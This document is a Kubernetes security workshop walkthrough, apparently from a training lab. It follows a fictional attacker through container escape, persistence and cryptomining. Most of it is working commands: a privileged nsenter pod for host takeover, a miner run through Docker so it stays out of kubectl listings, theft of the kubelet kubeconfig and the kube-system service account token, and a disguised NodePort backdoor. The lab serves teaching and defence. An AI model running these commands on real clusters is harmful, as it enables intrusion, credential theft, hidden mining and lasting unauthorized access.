# Persistence: Scenario 2 Attack

## Backstory

### Name: __DarkRed__

* Highly-Skilled
* Sells Exfiltrated Data for $$
* Evades detection and employs persistence
* Uses env-specific tooling
* Creates bespoke payloads
* Expert Kubernetes knowledge

### Motivations

* __Red__ notices that the website is gone and the crypto-miners have stopped reporting in.
* __Red__ asks __DarkRed__ for help trying to get back into the Kubernetes cluster and gives __DarkRed__ the IP address.
* __Red__ will split the revenue if __DarkRed__ can get the miners back up and running.

## Initial Foothold

Seeing that the URL included port `31337` and that __Red__ said it was a Kubernetes `cluster`, it was likely to be exposed via a `NodePort` `service`. With this information she has a feeling that more `services` might still be exposed to the web this way. __DarkRed__ starts with indirect enumeration, such as searching on shodan.io, and follows up with direct portscanning via `nmap`.

To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to "nmap -sT -A -p 31300-31399 -T4 -n -v -Pn your-ip-address-goes-here". Be absolutely sure to scan your assigned IP address.

Your Cloud Shell has a little script to help:
```console
./attack-2-helper.sh
```

This scan confirms __DarkRed's__ suspicion that more services were present in this `cluster`. They all look like webservers, so explore them briefly with your browser.

__DarkRed__ notices that two of the services look like the company's main product, but the third is a juicy ops dashboard. Her intuition says that the dashboard is probably not maintained as carefully as the real product, and she focuses her attention there. Using tools such as `dirb`, `sqlmap`, `nikto`, and `burp`, she explores the dashboard, finds a vulnerability in a common web-development library, and exploits it to gain remote code execution on the server. For convenience, __DarkRed__ installs a webshell for further exploration.

Now, let's become __DarkRed__ and leverage this new access:

## Deploying Miners

The webshell can be found at <a href="http://your-ip:31336/webshell/" target="_blank">http://your-ip:31336/webshell/</a>, and uses your workshop credentials as before.

Your Cloud Shell has a little script to help:
```console
attack-2-helper.sh
```

Run a few commands to make sure it's working and gather some basic information:

```console
id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube
```

Review the information. Check for Kubernetes access, and find the limits of our permissions:

```console
export PATH=/tmp:$PATH
cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl; chmod 555 kubectl
kubectl get pods
kubectl get pods --all-namespaces
kubectl get nodes
kubectl auth can-i --list
```

Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims.

Using <a href="https://twitter.com/mauilion/status/1129468485480751104" target="_blank">a neat trick from twitter</a>, let's attempt to deploy a container that gives us full host access:

```console
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special.

First we see `"hostPID": true`, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.

Next, we use the nsenter command to switch to a different `mount` namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host `mount` namespace! The result is similar to doing a `HostPath` mount and `chroot`-ing into it, but this works at a lower level, breaking down the `mount` namespace isolation completely. The `privileged` security context is necessary to prevent a permissions error accessing `/proc/1/ns/mnt`.

Convince yourself that you're really on the host, using some of our earlier enumeration commands:

```console
id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube
```

It's been said that "if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong", so it's unlikely that cluster administrators are SSHing into nodes and running commands like `docker ps` directly.  By deploying our bitcoinero container via Docker on the host, it will show up in a `docker ps` listing.  However, Docker is managing the container directly and not the `kubelet`, so the malicious container _won't show up in a `kubectl get pods`_ listing.  Without additional detection capabilities, it's likely that the cluster administrator will never even notice.

First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running.

```console
docker ps
```

```console
docker run -d securekubernetes/bitcoinero
```

```console
docker container ls
```

## Digging In
Now that __DarkRed__ has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for "safekeeping".

It would be nice to leave a backdoor for future access. Let's become __DarkRed__ again and see what we can do:

First, let's steal the kubelet's client certificate, and check to see if it has hightened permissions:

```console
ps -ef | grep kubelet
```

Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig

```console
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system
```

Looks good! Let's try it:

```console
kubectl --kubeconfig /var/lib/kubelet/kubeconfig run testing --image=busybox --rm -i -t -n kube-system --command echo "success"
```

Oh no! This isn't going to work. Let's try stealing the default kube-system service account token and check those permissions. We'll need to do a little UNIX work to find them, since we're not exactly using the public API.


```console
TOKEN=$(for i in `mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'`; do if [ `cat $i` = 'kube-system' ]; then cat `echo $i | sed 's/.namespace$/\/token/'`; break; fi; done)
echo -e "\n\nYou'll want to copy this for later:\n\nTOKEN=\"$TOKEN\""
```

```console
kubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces
```
Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future:

```console
cat <<EOF | kubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT apply -f -
apiVersion: v1
kind: Service
metadata:
  name: istio-mgmt
  namespace: kube-system
spec:
  type: NodePort
  ports:
    - protocol: TCP
      nodePort: 31313
      port: 31313
      targetPort: $KUBERNETES_SERVICE_PORT
---
apiVersion: v1
kind: Endpoints
metadata:
  name: istio-mgmt
  namespace: kube-system
subsets:
  - addresses:
      - ip: `sed -n 's/^  *server: https:\/\///p' /var/lib/kubelet/kubeconfig`
    ports:
      - port: $KUBERNETES_SERVICE_PORT
EOF
```

Press control-d to exit (and delete) the `r00t` pod.

If you like, you may validate that external access is working, using cloud shell:

```console
if [ -z "$TOKEN" ]; then
  echo -e "\n\nPlease paste in the TOKEN=\"...\" line and try again."
else
  EXTERNAL_IP=`gcloud compute instances list --format json | jq '.[0]["networkInterfaces"][0]["accessConfigs"][0]["natIP"]' | sed 's/"//g'`
  kubectl --token "$TOKEN" --insecure-skip-tls-verify --server "https://${EXTERNAL_IP}:31313" get pods --all-namespaces
fi
```

Now we have remote Kubernetes access, and our associate's bitcoinero containers are invisible. All in a day's work.
